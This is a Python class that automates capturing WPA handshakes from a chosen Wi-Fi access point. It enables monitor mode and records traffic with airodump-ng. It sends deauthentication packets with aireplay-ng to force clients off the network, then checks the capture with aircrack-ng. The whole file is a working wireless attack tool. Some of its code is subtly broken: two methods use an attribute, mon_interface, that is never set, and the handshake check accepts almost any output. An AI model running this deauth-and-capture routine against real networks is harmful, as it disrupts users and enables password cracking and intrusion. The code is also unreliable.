import subprocess
import os
import time

class HandshakeCapture:
    def __init__(self, interface, bssid, channel, output_dir="/tmp"):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)
        self.output_file = os.path.join(output_dir, f"capture-{bssid.replace(':', '')}")
        self.airodump_proc = None
        self.aireplay_proc = None
        self.monitor_iface = None  # New: track monitor interface

    def _enable_monitor_mode(self):
        """Put interface into monitor mode using airmon-ng."""
        try:
            # Kill interfering processes
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, text=True)
            
            # Start monitor mode
            result = subprocess.run(["airmon-ng", "start", self.interface], 
                                  capture_output=True, text=True, timeout=15)
            
            # Extract monitor interface name (usually wlan0mon or wlan0)
            for line in result.stdout.splitlines():
                if "mon" in line or "monitor" in line.lower():
                    self.monitor_iface = line.strip().split()[-1] if line.strip() else self.interface + "mon"
                    break
            if not self.monitor_iface:
                self.monitor_iface = self.interface + "mon"  # fallback
            
            print(f"[+] Monitor mode enabled on {self.monitor_iface}")
            return self.monitor_iface
        except Exception as e:
            print(f"[!] Monitor mode failed: {e}. Trying without...")
            return self.interface

    def start_capture(self):
        """Start airodump-ng (with monitor mode)."""
        try:
            mon_iface = self._enable_monitor_mode()
            self.interface = mon_iface  # Update to monitor interface
            
            cmd = [
                "airodump-ng",
                "--bssid", self.bssid,
                "--channel", self.channel,
                "--write", self.output_file,
                "--output-format", "cap",
                mon_iface
            ]
            self.airodump_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return True
        except Exception as e:
            raise Exception(f"Failed to start airodump-ng: {e}")

    def send_deauth(self, count=15):
        """Send deauthentication packets"""
        try:
            time.sleep(2)
            mon_iface = self.mon_interface or f"{self.interface}mon"
            
            cmd = [
                "aireplay-ng",
                "--deauth", str(count),
                "-a", self.bssid,
                mon_iface
            ]
            subprocess.run(cmd, timeout=15, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception as e:
            raise Exception(f"Failed to send deauth: {e}")

    def stop_capture(self):
        """Stop capture and restore interface"""
        if self.airodump_proc:
            self.airodump_proc.terminate()
            try:
                self.airodump_proc.wait(timeout=5)
            except:
                self.airodump_proc.kill()
        
        # Restore managed mode
        try:
            mon_iface = self.mon_interface or f"{self.interface}mon"
            subprocess.run(["airmon-ng", "stop", mon_iface], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "restart", "NetworkManager"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    def get_cap_file(self):
        return f"{self.output_file}-01.cap"

    def check_handshake(self):
        cap_file = self.get_cap_file()
        if not os.path.exists(cap_file):
            return False
        try:
            result = subprocess.run(["aircrack-ng", cap_file], 
                                  capture_output=True, text=True, timeout=10)
            return "1 handshake" in result.stdout.lower() or "handshake" in result.stdout.lower()
        except:
            return os.path.getsize(cap_file) > 20000